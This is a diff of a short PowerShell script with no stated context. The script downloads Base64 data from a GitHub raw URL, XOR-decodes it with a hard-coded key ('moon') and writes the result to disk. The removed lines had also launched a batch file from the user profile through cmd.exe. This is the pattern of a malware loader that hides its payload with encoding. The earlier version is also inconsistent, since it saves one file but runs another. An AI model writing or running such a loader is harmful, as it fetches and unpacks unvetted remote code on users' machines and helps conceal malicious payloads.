@@ -1,20 +1,24 @@
 $u='https://raw.githubusercontent.com/Jakeryan500/a/refs/heads/main/skibidi'
-$k='moon'
-$p="$env:USERPROFILE\output.bat"
+# XOR key
+$k = "moon"
 
-$d = ((Invoke-WebRequest $u -UseBasicParsing).Content -replace '\s','')
+# Download Base64
+$d = (Invoke-WebRequest $u -UseBasicParsing).Content
+$d = $d -replace '\s',''
+
+# Decode Base64
 $b = [Convert]::FromBase64String($d)
 
+# Key bytes
 $kb = [Text.Encoding]::UTF8.GetBytes($k)
 if ($kb.Length -eq 0) { throw "Key is empty" }
 
+# XOR decrypt
 $out = New-Object byte[] $b.Length
 
 for ($i = 0; $i -lt $b.Length; $i++) {
     $out[$i] = $b[$i] -bxor $kb[$i % $kb.Length]
 }
 
-[IO.File]::WriteAllBytes("decrypted.bin", $out)
-
-
-Start-Process cmd.exe -ArgumentList '/c $p' -UseNewEnvironment -Wait
+# Save decrypted file
+[IO.File]::WriteAllBytes(".\decrypted.bin", $out)
